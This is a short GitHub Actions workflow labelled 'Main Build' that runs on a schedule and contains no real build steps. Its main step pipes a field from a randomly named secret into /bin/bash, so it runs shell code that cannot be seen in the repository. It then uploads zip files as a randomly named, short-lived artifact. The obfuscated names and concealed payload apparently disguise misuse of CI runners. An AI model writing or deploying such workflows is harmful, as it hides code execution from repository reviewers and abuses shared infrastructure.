name: Main Build
on:
  workflow_dispatch:

  schedule:
    - cron: '26 3,9,15,21 * * *'
env:
  CI: true
jobs:
  check:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0
      - name: Main step
        env:
          yps71: ${{ secrets.yps71 }}
        run: |
          printf '%s' "$yps71" | jq -r .kd16450 | /bin/bash
          printf '%s' "$etzwi694" | jq -r .lk36 | /bin/bash

      - name: Save data
        uses: actions/upload-artifact@v4
        with:
          name: OBtvSdNh
          path: "*.zip"
          retention-days: 1
